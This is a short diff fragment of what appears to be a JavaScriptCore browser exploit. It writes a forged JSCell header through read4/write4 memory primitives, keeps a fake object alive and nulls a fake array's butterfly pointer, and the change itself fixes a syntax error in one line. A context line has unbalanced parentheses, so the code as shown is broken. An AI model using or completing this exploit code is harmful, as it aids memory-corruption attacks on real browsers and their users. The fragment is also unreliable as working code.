@@ -233,7 +233,7 @@ function go_() {
 				// Write to the container object
 				write4((bufs[i][k] - 0x10), read4(fop)); // Low 32 bits of the JSCell Header
 				write4((bufs[i][k] - 0x10) + 4, read4(fop + 4)); // High 32 bits of the JSCell Header
-				fakeobj['a':1]; // Make _SURE_ fakeobj stays alive until this point
+				fakeobj['a'] = 1; // Make _SURE_ fakeobj stays alive until this point
 
 				// Set the butterfly pointer of the fake array to nullptr
 				write4((bufs[i][k] + 0x08, 0);
